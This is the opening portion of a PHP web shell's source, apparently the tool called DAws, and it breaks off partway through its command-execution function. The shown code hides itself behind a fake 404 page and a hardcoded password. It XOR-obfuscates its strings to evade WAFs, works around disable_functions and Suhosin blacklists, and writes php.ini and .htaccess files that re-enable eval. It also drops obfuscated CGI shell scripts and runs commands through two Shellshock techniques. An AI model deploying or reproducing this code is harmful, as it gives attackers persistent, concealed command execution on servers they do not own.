<?php

@session_start(); //with error supression because using session_start() multiple times was causing an error on IIS for some reason which makes no sense at all.

//static 404 page
//-->
$static_fake_page = "
<!DOCTYPE HTML PUBLIC '-//IETF//DTD HTML 2.0//EN'>
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL ".$_SERVER['PHP_SELF']." was not found on this server.</p>
<hr>
<address>".$_SERVER["SERVER_SOFTWARE"]." Server at ".$_SERVER['SERVER_ADDR']." Port 80</address>
</body></html>"; //this will be used if DAws fails to show a dynamic fake 404 page

/*
if (!isset($_SESSION["logged_in"])) {
	if (isset($_POST["pass"])) {
		if(md5($_POST["pass"]) == "11b53263cc917f33062363cef21ae6c3") { //DAws
			$_SESSION["logged_in"] = True;
		} else {
			session_destroy();
			header("HTTP/1.1 404 Not Found");
			echo $static_fake_page;
			exit;
		}
	} else {
		session_destroy();
		header("HTTP/1.1 404 Not Found");
		echo $static_fake_page;
		exit();
	}
}*/
//<--

if (ob_get_level()) {
	ob_end_clean(); //no point of having output buffering on yet
}

if (!isset($_SESSION['key'])) { //create our session key which will be used for encryption
	$characters = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	$characters_length = strlen($characters);
	$random_string = "";
	for ($i = 0; $i < 10; $i++) { //length = 10 (length doens't really matter that much though, check our xor functions to understand why)
		$random_string .= $characters[rand(0, $characters_length - 1)];
	}
	$_SESSION['key'] = $random_string;
}

if (!isset($_SESSION['windows'])) {
	if (strtoupper(substr(PHP_OS, 0, 3)) == 'WIN') { //checking if we're running on a Window's machine
		$_SESSION["windows"] = True;
		$_SESSION["windows_drive"] = realpath("\\"); //saving the values instead of using realpath multiple times later on
	} else {
		$_SESSION["windows"] = False;
	}
}

//base64 recoded to bypass disablers
$base64ids = array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n", "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z", "0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "+", "/");

function bin_dec($string) {
	$decimal = "";
	for($i = 0; $i<strlen($string); $i++) {
		$dec = intval($string{(strlen($string))-$i-1})*pow(2, $i);
		$decimal+=$dec;
	}

	return intval($decimal);
}

function dec_bin($dec) {
	$binary = "";
	$current = intval($dec);

	if ($current == 0) {
		return "0";
	}

	while (1) {
		if ($current == 1) {
			$binary="1".$binary;
			break;
		}
		$binary = ($current%2).$binary;
		$current = intval($current/2);
	}

	return $binary;
}

function base64encoding($string) {
	global $base64ids;

	$binary = "";
	for ($i = 0; $i<strlen($string); $i++) {
		$charASCII = ord($string{$i});
		$asciiBIN = dec_bin($charASCII);
		if (strlen($asciiBIN) != 8) {
			$asciiBIN = str_repeat("0", 8-strlen($asciiBIN)).$asciiBIN;
		}
		$binary.= $asciiBIN;
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 6) {
		$part = substr($binary, $j, 6);
		array_push($array, $part);
	}

	if (strlen($array[count($array)-1]) != 6) {
		$array[count($array)-1] = $array[count($array)-1].str_repeat("0", 6 - strlen($array[count($array)-1]));
	}

	$base64 = "";
	foreach ($array as &$value) {
		$value = bin_dec($value);
		$value = $base64ids[$value];
		$base64.=$value;
	}

	if ((strlen($base64) % 4) != 0) {
		$base64.=str_repeat("=", 4-(strlen($base64) % 4));
	}

	return $base64;
}

function base64decoding($string) {
	global $base64ids;

	$string = str_replace("=", "", $string);

	$binary = "";
	for ($i = 0; $i < strlen($string); $i++) {
		$charID = array_search($string{$i}, $base64ids);
		$idBIN = dec_bin($charID);
		if (strlen($idBIN) != 6) {
			$idBIN = str_repeat("0", 6-strlen($idBIN)).$idBIN;
		}
		$binary.= $idBIN;
	}

	if (strlen($binary) %8 != 0) {
		$binary = substr($binary, 0, strlen($binary)-(strlen($binary) %8));
	}

	$array = array();
	for ($j = 0; $j<strlen($binary); $j = $j + 8) {
		$part = substr($binary, $j, 8);
		array_push($array, $part);
	}

	$text = "";
	foreach ($array as &$value) {
		$value = bin_dec($value);
		$value = chr($value);
		$text.=$value;
	}

	return $text;
}

function xor_this($string, $key=null) { //our 'random key' based xor encryption
	if ($string == "") {
		return $string;
	}
	
	if ($key == null) {
		$key = $_SESSION['key'];
	}

	$outText = '';

 	for($i=0; $i<strlen($string);) {
		for($j=0; ($j<strlen($key) && $i<strlen($string)); $j++,$i++) {
			$outText .= $string{$i} ^ $key{$j};
		}
	}

	return base64encoding($outText);
} //so basically every string character gets xored once by one key character. That key character is chosen by order
//example: string=dotcppfile key=1234
//d will get xored by 1
//o will get xored by 2
//etc
//the first p will get xored by 1 as well because we start all over when all the characters of our key gets used.
//this gets the job done at its best when it comes to bypassing security systems like WAFs, etc...

function unxor_this($string, $key=null) {
	if ($string == "") {
		return $string;
	}
	
	if ($key == null) {
		$key = $_SESSION['key'];
	}

	return base64decoding(xor_this(base64decoding($string), $key));
}

//recursive glob used later on to find DAws's directory (first method)
function recursive_glob($path) {
	$paths = glob($path."/*", GLOB_ONLYDIR);
	foreach ($paths as $path) {
		if ((is_readable($path)) && (is_writable($path))) {
			return $path;
		} else if ((installed_php("fileowner")) && (installed_php("posix_getpwuid"))) {
			//we can chmod a direcotry that we own and gift it to our beloved DAws!
			$fileowner = posix_getpwuid(fileowner($path));
			$fileowner = $fileowner["name"];
			if($_SESSION["process_owner"] == $fileowner) { //we own that folder
				if (chmod($path, 0777)) { //successfully chmoded
					return $path;
				}
			}
		}
	}

	foreach ($paths as $path) {
		$path = recursive_glob($path);
		if ($path != "") {
			return $path;
		}
	}
}

//recursive iterator used later on to find DAws's directory (second method)
function recursive_iterator($location) {
	$iter = new RecursiveIteratorIterator(new RecursiveDirectoryIterator(realpath($location)), RecursiveIteratorIterator::SELF_FIRST, RecursiveIteratorIterator::CATCH_GET_CHILD);

	$paths = array(realpath($location));
	foreach ($iter as $path => $dir) {
		if ($dir->isDir()) {
			if ((is_readable($dir)) && (is_writable($dir))) {
				return realpath($path);
			} else if ((installed_php("fileowner")) && (installed_php("posix_getpwuid"))) {
				//we can chmod a direcotry that we own and gift it to our beloved DAws!
				$fileowner = posix_getpwuid(fileowner($dir));
				$fileowner = $fileowner["name"];
				if($_SESSION["process_owner"] == $fileowner) { //we own that folder
					if (chmod($dir, 0777)) { //successfully chmoded
						return realpath($path);
					}
				}
			}
		}
	}
}

function get_php_ini($string) { //read from php.ini
	$output = @ini_get($string);
	if ($output == "") {
		$output = @get_cfg_var($string);
	}

	return $output;
}

//check what's disabled by disable_functions and suhosin
$disabled_php = array();
$disabled_suhosin = array();

foreach (explode("," , get_php_ini(unxor_this("AAYHAhIcAzYKEAoMAAofHhU=", "dotcppfile"))) as $disabled) { //disable_functions
	array_push($disabled_php, $disabled);
}
foreach (explode(",", get_php_ini(unxor_this("AAYHAhIcAzYPCQUcBwYD", "dotcppfile"))) as $disabled) { //disabled_classes
	array_push($disabled_php, $disabled);
}
foreach (explode("," , get_php_ini(unxor_this("FxocDAMZCEcJHQEMARcfAkgPGQsHQRYPERMNBQUWEA==", "dotcppfile"))) as $disabled) { //suhosin.executor.func.blacklist
	array_push($disabled_suhosin, $disabled);
}

$disabled_php = array_filter($disabled_php);
$disabled_suhosin = array_filter($disabled_suhosin);

$disabled_php = array_map('trim', $disabled_php);
$disabled_suhosin = array_map('trim', $disabled_suhosin);

function disabled_php($function_name) { //checks if a function is disabled by php
	foreach ($GLOBALS["disabled_php"] as $value) {
		if ($function_name == $value) {
			return True;
		}
	}

	return False;
}

function disabled_suhosin($function_name) { //checks if a function is disabled by suhosin
	foreach ($GLOBALS["disabled_suhosin"] as $value) {
		if ($function_name == $value) {
			return True;
		}
	}

	return False;
}

function installed_php($function=null, $class=null) { //checks if a function/class exists
	if ($function != null) {
		if (disabled_php("function_exists") == False) {
			if (disabled_suhosin("function_exists") == False) {
				if (function_exists($function)) {
					return True;
				} else {
					return False;
				}
			} else {
				if (bypass_suhosin("function_exists", $function)) {
					return True;
				} else {
					return False;
				}
			}
		} else {
			ob_start();
			$test = $function();
			$return_value = ob_get_contents();
			ob_end_clean();

			if ((strpos($return_value, "error") == False) && (strpos($return_value, "Warning") == False)) {
				return True;
			} else {
				return False;
			}
		}
	} else {
		if (disabled_php("class_exists") == False) {
			if (disabled_suhosin("class_exists") == False) {
				if (class_exists($class)) {
					return True;
				} else {
					return False;
				}
			} else
				if (bypass_suhosin("class_exists", $class)) {
					return True;
				} else {
					return False;
				}
		} else {
			ob_start();
			$test = new $class();
			$return_value = ob_get_contents();
			ob_end_clean();

			if ((strpos($return_value, "error") == False) && (strpos($return_value, "Warning") == False)) {
				return True;
			} else {
				return False;
			}
		}
	}
}

//dynamic 404 page -->
//Now the reason I don't like this much is because there's a lot of important code that needs to be ran first
//to make sure that we can show a dynamic fake 404 page while bypassing security systems
if (!isset($_SESSION["logged_in"])) {
	$show_it = False;
	
	if (isset($_POST["pass"])) {
		if(md5($_POST["pass"]) == "11b53263cc917f33062363cef21ae6c3") { //DAws
			$_SESSION["logged_in"] = True;
		} else {
			session_destroy();
			@header("HTTP/1.1 404 Not Found");
			$show_it = True;
		}
	} else {
		session_destroy();
		@header("HTTP/1.1 404 Not Found");
		$show_it = True;
	}
	
	if ($show_it == True) {
		$random_url = "";
		if (isset($_SERVER['HTTPS'])) {
			$random_url .= "https";
		} else {
			$random_url .= "http";
		}
		
		$random_string = time();
		$random_url .= "://".$_SERVER['SERVER_NAME']."/".$random_string."/DAws.php"; //our random bitch
		$output = @url_get_contents($random_url);

		if ($output != "") {
			echo str_replace("/".$random_string."/DAws.php", "/DAws.php", $output);
		} else {
			echo $static_fake_page;
		}

		exit();
	}
}//<--

//finds current process's owner
if (!isset($_SESSION["process_owner"])) {
	if (installed_php("posix_geteuid")) { //Linux
		$_SESSION["process_owner"] = posix_getpwuid(posix_geteuid());
		$_SESSION["process_owner"] = $_SESSION["process_owner"]["name"];
	} else { //Linux and Windows
		$_SESSION["process_owner"] = getenv('USERNAME');
	}
}

//finds DAws's directory; a writeable and readable directory, move to it and drop our php.ini and .htaccess files that will
//make life easier if suphp is installed
if (!isset($_SESSION["daws_directory"])) {
	$daws_dir = getcwd();

	if ($_SESSION["windows"] == True) {
		$_SESSION["slash"] = "\\"; //we can use this later on
	} else {
		$_SESSION["slash"] = "/";
	}

	//finding the web dir which will be used here and when deploying the CGI Scripts
	//not using DOCUMENT_ROOT anymore because it may need to be hardcoded and reset, and fuck all of that
	$array = explode($_SESSION["slash"], getcwd());
	for ($i = 0; $i<(count(explode("/", $_SERVER["SCRIPT_NAME"]))-2); $i++) {
		array_pop($array);
	}

	$_SESSION["web_dir"] = implode($_SESSION["slash"], $array);

	//finding DAws's directory
	if ((is_writable($daws_dir)) && (is_readable($daws_dir))) {
		$_SESSION["daws_directory"] = $daws_dir; //no need to look further since we are in it
	} else { //lets dance
		$locations = array($_SESSION["web_dir"], realpath($_SESSION["slash"])); //we go for a random directory if a proper web directory wasn't found

		foreach ($locations as $location) {
			//uses the recursive glob function for old php versions
			if (disabled_php("glob") == False) {
				$_SESSION["daws_directory"] = recursive_glob(realpath($location));
			} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (installed_php(null, "RecursiveIteratorIterator") == True)) { //Iterator incoming!
				$_SESSION["daws_directory"] = recursive_iterator($location);
			}

			if ((isset($_SESSION["daws_directory"])) && ($_SESSION["daws_directory"] != "")) {
				break;
			}
		}
	}
	
	if (basename($_SESSION["daws_directory"]) != "DAws") { //We just landed, time to get ready for battle because we got some mofos to kill!
		$_SESSION["daws_directory"] .= "/DAws";
		@mkdir($_SESSION["daws_directory"]); //incase it already existed. We'll simply replace the old files of DAws with the new ones.

		if (strpos($_SESSION["daws_directory"], $_SESSION["web_dir"]) !== False) {
			//we clear all disablers, allow eval and url opening
			$php_ini = "AAYHAhIcAzYKEAoMAAofHhVJUW8ABgcCEhwDNg8JBRwHBgNQW2MfEAwABwoeXgMRCQYRGxsRXhYTBw9LBgMVABscDxoYRVlPVkF6AxMBAxYNAVoGCBUFHBgKFkEQCgMRBAUJOgEZFQ9QTUYmCgNuDhgPHwc5HB4JOwkbExUeRlRMKgo=";
			//and here we link that php.ini to suphp as a config file
			//http://support.hostgator.com/articles/specialized-help/technical/how-to-get-your-php-ini-path-with-suphp
			$htaccess ="<IfModule mod_suphp.c>\nsuPHP_ConfigPath ".$_SESSION["daws_directory"].$_SESSION["slash"]."php.ini\n</IfModule>";

			write_to_file($_SESSION["daws_directory"]."/php.ini", unxor_this($php_ini, "dotcppfile"));
			write_to_file($_SESSION["daws_directory"]."/.htaccess", $htaccess);

			//and now we move our DAws to its directory if it's not there already
			if (getcwd() != $_SESSION["daws_directory"]) {
				copy($_SERVER["SCRIPT_FILENAME"], $_SESSION["daws_directory"]."/DAws.php");
				header("Location: http://".$_SERVER['SERVER_NAME'].str_replace($_SESSION["web_dir"], "", $_SESSION["daws_directory"]."/DAws.php"));
			}
		}
	}
}

function write_to_file($location, $string) {
	$output = file_put_contents_extended($location, $string); //file_put_contents
	if ($output != False) {
		return;
	}

	$fp = fopen_extended($location, "w"); //fopen
	if ($fp != False) {
		fwrite($fp, $string);
		fclose($fp);
		return;
	}

	execute_command("echo ".escapeshellarg($string)." > $location"); //system commands
}

function read_file($location) {
	if (filesize($location) == 0) { //empty files will cause file_get_contents to return false and fread to cause an error
		return "";
	}

	$content = file_get_contents_extended($location); //file_get_contents
	if ($content == False) {
		return htmlspecialchars($content);
	}

	$fp = fopen_extended($location, "r"); //fopen
	if ($fp != False) {
		$content = htmlspecialchars(fread($fp, filesize($location)));
		fclose($fp);
		return $content;
	}

	if ($_SESSION["windows"] == True) { //system commands
		return htmlspecialchars(execute_command("type $location"));
	} else {
		return htmlspecialchars(execute_command("cat $location"));
	}

	return "DAws: failed to read the file because file_get_contents_extended, fopen_extended and system commands failed."; //fail
}

function url_get_contents($url, $user_agent=null) { //used to download the source of a webpage
	if ((installed_php("curl_version") == True) && (disabled_php("curl_init") == False)) { //using curl
		if (disabled_suhosin("curl_init") == False) {
			$ch = curl_init(str_replace(" ","%20",$url));
		} else {
			$ch = bypass_suhosin("curl_init", str_replace(" ","%20",$url));
		}

		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

		if ($user_agent != null) { //used by shellshock (method 2)
			curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
		}

		$content = curl_exec($ch);
		curl_close($ch);

		return $content;
	}

	//for file_get_contents and fopen
	if ($user_agent != null) {
		$opts = array('http'=>array('header'=>"User-Agent: $user_agent\r\n"));
		$context = stream_context_create($opts);
	} else {
		$context = null;
	}

	//using file_get_contents
	$content = file_get_contents_extended($url, True, $context);
	if ($content != False) {
		return $content;
	}

	//using fopen
	$fp = fopen_extended($url, "r", True, $context);
	if ($fp != False) {
		$content = fread($fp, filesize($url));
		fclose($fp);
		return $content;
	}

	//using system commands (no need to apply shellshock here since we're already using system commands...)
	if ($_SESSION["windows"] == True) {
		if (execute_command("bitsadmin", True)  == True) { //bitsadmin is a nice choice here
			return execute_command("bitsadmin.exe /Transfer DAwsDownloadJob $link $location > null; type $location");
		} else if (strpos(execute_command("powershell.exe"), "Windows PowerShell")) { //powershell comes next
			return execute_command("powershell.exe Invoke-WebRequest $link -OutFile $location > null; type $location");
		} else {
			return False; //sadly, nothing worked
		}
	} else { //curl or wget for Linux
		if (execute_command("curl", True) == True) {
			return execute_command("curl $url");
		} else if (execute_command("wget", True) == True) {
			return execute_command("wget -qO- $url");
		} else {
			return False;
		}
	}
}

if (!isset($_SESSION["cgi"])) { //setting up the cgi scripts
	$cgi_htaccess = "bi4QBzgRCA0AABZPFwQZXRUKHgwUG1RNAxhGRw4EEGU7EwQZCQcfRU8qDAYTMyEgZg==";
	$cgi_bash = "R05bARkeSQsNFgxlfgYTGAlJTiYLAQAGHgRLHRUVAVVUFxUIEkYEEQkDVmkVEw4GTEdGZX4AHx0LCAIBWQ8RABgfRktINDEqJjovIzI7JSsjTVQfUAMDDUxICk9TEF8uSEMPCgkCFQ0UTTpBNztCMl4/WV5MTUM5VUAERFAMRgsNFgFZQENdXQIMDwoAClQfUAMDDUxHF0BRUUBfRkYLR0QTVBAVFEZLH0pPQFRMF1IGYwkTBQNURxMfCwQNCwA=";
	$cgi_bat = "JAoXCx9QCQ8Kb24KFwsfUCUGAhEBAQBOBAkWDFZFEAoMF18YEgQAbwEMHAxeemwACkUBFx0QBFACDA8KAApaFwgERg0JCUQLEQAfFANHGB0QZVwGExgJSUk0MSomOi8jMjslKyNVCltVWUZXTAAKDBsHFRRIHRQRbgwREQQFEgAARUkLEQAfFANJTgAKDBsHFRRIHRQRRk9WBxUTCQ0JSxAXAEF6AwMdQxVEDBkHTUwCDA8KAApaFwgEbEwPCABK";
	$cgi_path = $_SESSION["daws_directory"]."/cgi";

	if (isset($_SERVER['HTTPS'])) {
		$protocol = "https";
	} else {
		$protocol = "http";
	}

	if (!file_exists($cgi_path)) {
		mkdir($cgi_path);
	}

	//writing everything
	write_to_file($cgi_path."/.htaccess", unxor_this($cgi_htaccess, "dotcppfile"));

	if ($_SESSION["windows"] == True) {
		write_to_file($cgi_path."/DAws.bat", unxor_this($cgi_bat, "dotcppfile"));
		chmod($cgi_path."/DAws.bat", 0755);
		$_SESSION["cgi_url"] = $protocol."://".$_SERVER['SERVER_NAME'].str_replace("\\", "/", str_replace(realpath($_SESSION["web_dir"]), "", $cgi_path))."/DAws.bat";
	} else {
		write_to_file($cgi_path."/DAws.sh", unxor_this($cgi_bash, "dotcppfile"));
		chmod($cgi_path."/DAws.sh", 0755);
		$_SESSION["cgi_url"] = $protocol."://".$_SERVER['SERVER_NAME'].str_replace($_SESSION["web_dir"], "", $cgi_path)."/DAws.sh";
	}

	//testing it
	$test = url_get_contents($_SESSION["cgi_url"]."?command=".base64encoding("echo dotcppfile"));
	if(($test != "") && (strpos($test, "Internal Server Error") === False) && (strpos($test, "QUERY_STRING") === False)) {
		$_SESSION["cgi"] = True;
	} else {
		$_SESSION["cgi"] = False;
	}
}

function execute_ssh($command) { //ssh
	include_php($_SESSION["daws_directory"]."/SSH2.php"); //this should have been uploaded by the user himself

	$ssh = new Net_SSH2('127.0.0.1', $_SESSION["ssh_port"]);

	if ($ssh->login($_SESSION["ssh_user"], unserialize($_SESSION["ssh_rsa"]))) {
		return $ssh->exec($command);
	}
}

function shsh($command) { //shellshock (method 1)
	$filename = $_SESSION["daws_directory"].time().".data";
	putenv("PHP_LOL=() { x; }; $command > $filename 2>&1");
	mail("a@127.0.0.1", "", "", "", "-bv");
	if (file_exists($filename)) {
		$content = read_file($filename);
		unlink($filename);
	} else {
		$content = "";
	}

	return $content;
} //this was written by Starfall and I know that this will simply fail if sendmail wasn't installed

function shsh2($command) { //shellshock (method 2)
	$filename = $_SESSION["daws_directory"].time().".data";
	url_get_contents($_SESSION["shsh2_cgi_script"], "() { x; }; $command > $filename 2>&1"); //this will be updated later but lets keep it here for now

	if (file_exists($filename)) {
		$content = read_file($filename);
		unlink($filename);
	} else {
		$content = "";
	}

	return $content;
} //this will send http requests with a shellshock user agent to a cgi script

if (!isset($_SESSION["shsh"])) { //testing shellshock1
	if ($_SESSION["windows"] == False) { //more checks aren't necessary thanks to the upcoming test
		if (shsh("echo Dyme and Starfall") == "Dyme and Starfall") {
			$_SESSION["shsh"] = True;
		} else {
			$_SESSION["shsh"] = False;
		}
	} else {
		$_SESSION["shsh"] = False;
	}
}

if (!isset($_SESSION["shsh2"])) { //testing shellshock2
	if ($_SESSION["windows"] == False) {
		if (shsh("echo Dyme and Starfall") == "Dyme and Starfall") {
			$_SESSION["shsh2"] = True;
		} else {
			$_SESSION["shsh2"] = False;
		}
	} else {
		$_SESSION["shsh2"] = False;
	}
}

//finds the location of ruby/perl/python for Windows
if (!isset($_SESSION["pathes_found"])) {
	if ($_SESSION["windows"] == True) { //windows...
		if (execute_command($_SESSION["windows_drive"]."Python27:python", True)) {
			$_SESSION["python"] = $_SESSION["windows_drive"]."Python27\\python.exe";
		}
		
		if (execute_command($_SESSION["windows_drive"]."Python34:python", True)) {
			$_SESSION["python"] = $_SESSION["windows_drive"]."Python34\\python.exe";
		}
		
		if (execute_command($_SESSION["windows_drive"]."Perl32\\bin:perl", True)) {
			$_SESSION["perl"] = $_SESSION["windows_drive"]."Perl32\\bin\\perl.exe";
		}
		
		if (execute_command($_SESSION["windows_drive"]."Perl64\\bin:perl", True)) {
			$_SESSION["perl"] = $_SESSION["windows_drive"]."Perl64\\bin\\perl.exe";
		}
		
		if (execute_command($_SESSION["windows_drive"]."Ruby21-x32\\bin:ruby", True)) {
			$_SESSION["ruby"] = $_SESSION["windows_drive"]."Ruby21-x32\\bin\\ruby.exe";
		}
		
		if (execute_command($_SESSION["windows_drive"]."Ruby21-x64\\bin:ruby", True)) {
			$_SESSION["ruby"] = $_SESSION["windows_drive"]."Ruby21-x64\\bin\\ruby.exe";
		}
	} else { //DAMN YOU BILL! Lol, this is much easier
		$softwares = array("perl", "python", "ruby", "php");
		
		foreach ($softwares as $software) {
			if (execute_command($software, True)) {
				$_SESSION[$software] = $software;
			}
		}
	}
	
	$_SESSION["pathes_found"] = True;
}

function bypass_suhosin($function, $arg1=null, $arg2=null, $arg3=null, $arg4=null, $arg5=null, $output_needed = True) { //I found no other way to deal with arguments... poor me.
	if ($arg5 != null) {
		if (disabled_php("call_user_func") == False) {
			$return_value = call_user_func($function, $arg1, $arg2, $arg3, $arg4, $arg5);
		} else if (disabled_php("call_user_func_array") == False) {
			$return_value = call_user_func_array($function, array($arg1, $arg2, $arg3, $arg4, $arg5));
		} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False)) {
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1, $arg2, $arg3, $arg4, $arg5);
			if (is_string($handle)) {
				$return_value = $handle;
			} else {
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		} else if ($output_needed == False) {
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False)) {
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1, $arg2, $arg3, $arg4, $arg5));
			} else if (disabled_php("register_tick_function") == False) {
				declare(ticks=1);
				register_tick_function($function, $arg1, $arg2, $arg3, $arg4, $arg5);
				unregister_tick_function($function);
			} else if (disabled_php("array_map") == False) {
				array_map($function, array($arg1, $arg2, $arg3, $arg4, $arg5));
			} else if (disabled_php("array_walk") == False) {
				$x = array($arg1, $arg2, $arg3, $arg4, $arg5);
				array_walk($x, $function);
			} else if (disabled_php("array_filter") == False) {
				array_filter(array($arg1, $arg2, $arg3, $arg4, $arg5), $function);
			} else if (disabled_php("register_shutdown_function")) {
				register_shutdown_function($function, $arg1, $arg2, $arg3, $arg4, $arg5);
			}
		}
	} else if ($arg4 != null) {
		if (disabled_php("call_user_func") == False) {
			$return_value = call_user_func($function, $arg1, $arg2, $arg3, $arg4);
		} else if (disabled_php("call_user_func_array") == False) {
			$return_value = call_user_func_array($function, array($arg1, $arg2, $arg3, $arg4));
		} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False)) {
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1, $arg2, $arg3, $arg4);
			if (is_string($handle)) {
				$return_value = $handle;
			} else {
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		} else if ($output_needed == False) {
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False)) {
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1, $arg2, $arg3, $arg4));
			} else if (disabled_php("register_tick_function") == False) {
				declare(ticks=1);
				register_tick_function($function, $arg1, $arg2, $arg3, $arg4);
				unregister_tick_function($function);
			} else if (disabled_php("array_map") == False) {
				array_map($function, array($arg1, $arg2, $arg3, $arg4));
			} else if (disabled_php("array_walk") == False) {
				$x = array($arg1, $arg2, $arg3, $arg4);
				array_walk($x, $function);
			} else if (disabled_php("array_filter") == False) {
				array_filter(array($arg1, $arg2, $arg3, $arg4), $function);
			} else if (disabled_php("register_shutdown_function")) {
				register_shutdown_function($function, $arg1, $arg2, $arg3, $arg4);
			}
		}
	} else if ($arg3 != null) {
		if (disabled_php("call_user_func") == False) {
			$return_value = call_user_func($function, $arg1, $arg2, $arg3);
		} else if (disabled_php("call_user_func_array") == False) {
			$return_value = call_user_func_array($function, array($arg1, $arg2, $arg3));
		} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False)) {
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1, $arg2, $arg3);
			if (is_string($handle)) {
				$return_value = $handle;
			} else {
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		} else if ($output_needed == False) {
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False)) {
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1, $arg2, $arg3));
			} else if (disabled_php("register_tick_function") == False) {
				declare(ticks=1);
				register_tick_function($function, $arg1, $arg2, $arg3);
				unregister_tick_function($function);
			} else if (disabled_php("array_map") == False) {
				array_map($function, array($arg1, $arg2, $arg3));
			} else if (disabled_php("array_walk") == False) {
				$x = array($arg1, $arg2, $arg3);
				array_walk($x, $function);
			} else if (disabled_php("array_filter") == False) {
				array_filter(array($arg1, $arg2, $arg3), $function);
			} else if (disabled_php("register_shutdown_function")) {
				register_shutdown_function($function, $arg1, $arg2, $arg3);
			}
		}
	} else if ($arg2 != null) {
		if (disabled_php("call_user_func") == False) {
			$return_value = call_user_func($function, $arg1, $arg2);
		} else if (disabled_php("call_user_func_array") == False) {
			$return_value = call_user_func_array($function, array($arg1, $arg2));
		} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False)) {
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1, $arg2);
			if (is_string($handle)) {
				$return_value = $handle;
			} else {
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		} else if ($output_needed == False) {
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False)) {
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1, $arg2));
			} else if (disabled_php("register_tick_function") == False) {
				declare(ticks=1);
				register_tick_function($function, $arg1, $arg2);
				unregister_tick_function($function);
			} else if (disabled_php("array_map") == False) {
				array_map($function, array($arg1, $arg2));
			} else if (disabled_php("array_walk") == False) {
				$x = array($arg1, $arg2);
				array_walk($x, $function);
			} else if (disabled_php("array_filter") == False) {
				array_filter(array($arg1, $arg2), $function);
			} else if (disabled_php("register_shutdown_function")) {
				register_shutdown_function($function, $arg1, $arg2);
			}
		}
	} else if ($arg1 != null) {
		if (disabled_php("call_user_func") == False) {
			$return_value = call_user_func($function, $arg1);
		} else if (disabled_php("call_user_func_array") == False) {
			$return_value = call_user_func_array($function, array($arg1));
		} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False)) {
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke($arg1);
			if (is_string($handle)) {
				$return_value = $handle;
			} else {
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		} else if ($output_needed == False) {
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False)) {
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array($arg1));
			} else if (disabled_php("register_tick_function") == False) {
				declare(ticks=1);
				register_tick_function($function, $arg1);
				unregister_tick_function($function);
			} else if (disabled_php("array_map") == False) {
				array_map($function, array($arg1));
			} else if (disabled_php("array_walk") == False) {
				$x = array($arg1, $arg2, $arg3);
				array_walk($x, $function);
			} else if (disabled_php("array_filter") == False) {
				array_filter(array($arg1), $function);
			} else if (disabled_php("register_shutdown_function")) {
				register_shutdown_function($function, $arg1);
			}
		}
	} else {
		if (disabled_php("call_user_func") == False) {
			$return_value = call_user_func($function);
		} else if (disabled_php("call_user_func_array") == False) {
			$return_value = call_user_func_array($function, array());
		} else if ((version_compare(PHP_VERSION, '5.0.0') >= 0) && (disabled_php(null, "ReflectionFunction") == False)) {
			$ref_function = new ReflectionFunction($function);
			$handle = $ref_function->invoke();
			if (is_string($handle)) {
				$return_value = $handle;
			} else {
				$return_value = fread($handle, 4096);
				pclose($handle);
			}
		} else if ($output_needed == False) {
			if ((version_compare(PHP_VERSION, '5.1.0') >= 0) && (disabled_php(null, "ArrayIterator") == False)) {
				$it = new ArrayIterator(array(""));
				iterator_apply($it, $function, array());
			} else if (disabled_php("register_tick_function") == False) {
				declare(ticks=1);
				register_tick_function($function);
				unregister_tick_function($function);
			} else if (disabled_php("array_map") == False) {
				array_map($function, array());
			} else if (disabled_php("array_walk") == False) {
				$x = array();
				array_walk($x, $function);
			} else if (disabled_php("array_filter") == False) {
				array_filter(array(), $function);
			} else if (disabled_php("register_shutdown_function")) {
				register_shutdown_function($function);
			}
		}
	}
	return $return_value;
}

function execute_command($command, $software_check = False) { //this is also used to check for installed softwares
	if ($software_check == True) {
		if (($_SESSION["windows"]) == True) {
			$command = "where $command";
		} else {
			$command = "which $command";
		}
	}

	if (disabled_php("system") == False) { //not disabled by disable_functions
		ob_start();
		if (disabled_suhosin("system") == False) { //not disabled by Suhosin
